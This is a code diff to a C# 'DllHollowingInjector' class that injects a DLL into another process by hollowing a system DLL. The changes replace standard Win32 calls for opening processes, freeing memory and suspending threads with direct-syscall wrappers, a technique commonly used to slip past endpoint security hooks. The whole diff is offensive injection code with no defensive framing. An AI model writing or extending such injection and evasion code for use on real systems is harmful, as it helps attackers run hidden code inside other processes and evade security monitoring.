@@ -73,9 +73,14 @@ internal sealed unsafe class DllHollowingInjector : InjectorBase
                 return InjectionResult.Fail(Method, dllPath, "Invalid PE image: " + ex.Message);
             }
 
-            hProcess = NativeMethods.OpenProcess(ProcessAccess, false, pid);
-            if (hProcess == IntPtr.Zero)
-                return InjectionResult.Fail(Method, dllPath, "OpenProcess failed: " + Win32Error.LastError(), NativeMethods.GetLastError());
+            try
+            {
+                hProcess = OpenRemoteProcess(pid, ProcessAccess);
+            }
+            catch (Exception ex)
+            {
+                return InjectionResult.Fail(Method, dllPath, "OpenProcess failed: " + ex.Message);
+            }
 
             var candidate = FindSuitableSystemDll(pid, hProcess, (long)pe.SizeOfImage);
             var carrierPath = candidate.Path;
@@ -710,7 +715,7 @@ internal sealed unsafe class DllHollowingInjector : InjectorBase
     private static void SyscallFree(IntPtr hProcess, IntPtr address)
     {
         if (address != IntPtr.Zero)
-            NativeMethods.VirtualFreeEx(hProcess, address, UIntPtr.Zero, NativeConstants.MEM_RELEASE);
+            DirectSyscalls.NtFreeVirtualMemory(hProcess, address);
     }
 
     private static void SyscallWrite(IntPtr hProcess, IntPtr address, byte[] data)
@@ -793,11 +798,10 @@ internal sealed unsafe class DllHollowingInjector : InjectorBase
     {
         hThread = IntPtr.Zero;
         error = null;
-        var handle = NativeMethods.OpenThread(ThreadAccess, false, threadId);
+        var handle = OpenRemoteThread(threadId, ThreadAccess);
         if (handle == IntPtr.Zero)
             return false;
-        var previous = NativeMethods.SuspendThread(handle);
-        if (previous == unchecked((uint)-1))
+        if (DirectSyscalls.NtSuspendThread(handle, out var previous) != 0)
         {
             NativeMethods.CloseHandle(handle);
             return false;
